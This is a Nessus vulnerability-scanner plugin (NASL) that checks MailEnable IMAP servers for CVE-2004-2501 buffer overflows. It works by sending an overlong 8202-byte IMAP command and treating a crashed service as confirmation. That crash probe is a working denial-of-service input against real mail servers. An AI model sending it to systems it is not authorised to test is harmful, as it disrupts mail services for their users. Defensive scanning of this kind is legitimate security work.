#%NASL_MIN_LEVEL 70300
#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

# Changes by Tenable:
# - Revised plugin title (10/22/09)

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(15852);
  script_version("1.19");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2004-2501");
  script_bugtraq_id(11755);

  script_name(english:"MailEnable IMAP Server Multiple Remote Buffer Overflows");

  script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by several buffer overflow issues.");
  script_set_attribute(attribute:"description", value:
"The target is running at least one instance of MailEnable's IMAP
service.  Two flaws exist in MailEnable Professional Edition 1.52 and
earlier as well as MailEnable Enterprise Edition 1.01 and earlier - a
stack-based buffer overflow and an object pointer overwrite.  A remote
attacker can use either vulnerability to execute arbitrary code on the
target.");
  script_set_attribute(attribute:"see_also", value:"http://www.hat-squad.com/en/000102.html");
  script_set_attribute(attribute:"see_also", value:"http://www.mailenable.com/hotfix/default.aspx");
  script_set_attribute(attribute:"solution", value:
"Apply the IMAP hotfix dated 25 November 2004.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2004/11/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2004/11/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mailenable:mailenable");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Windows");

  script_copyright(english:"This script is Copyright (C) 2004-2022 George A. Theall");

  script_dependencies("find_service1.nasl", "global_settings.nasl");
  script_exclude_keys("imap/false_imap");
  script_require_ports("Services/imap", 143);

  exit(0);
}

include("global_settings.inc");

# NB: MailEnable doesn't truly identify itself in the banner so we just
#     connect and send a long command to try to bring down the service 
#     if it looks like it's MailEnable.
port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);
banner = get_kb_item("imap/banner/" + port);
if ("IMAP4rev1 server ready at" >!< banner) exit(0);

# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);

# Read banner.
s = recv_line(socket:soc, length:1024);
if (!strlen(s)) {
  close(soc);
  exit(0);
}
s = chomp(s);

# Send a long command and see if the service crashes.
#
# nb: this tests only for the stack-based buffer overflow; the object
#     pointer overwrite vulnerability reportedly occurs in the same
#     versions so we just assume it's present if the former is.
c = string("a1 ", crap(8202));
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:"^a1 (OK|BAD|NO)", string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp='';
}
# If we don't get a response, make sure the service is truly down.
if (!resp) {
  close(soc);
  soc = open_sock_tcp(port);
  if (!soc) {
    security_hole(port);
    exit(0);
  }
}

# Logout.
c = string("a2", " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:"^a2 (OK|BAD|NO)", string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
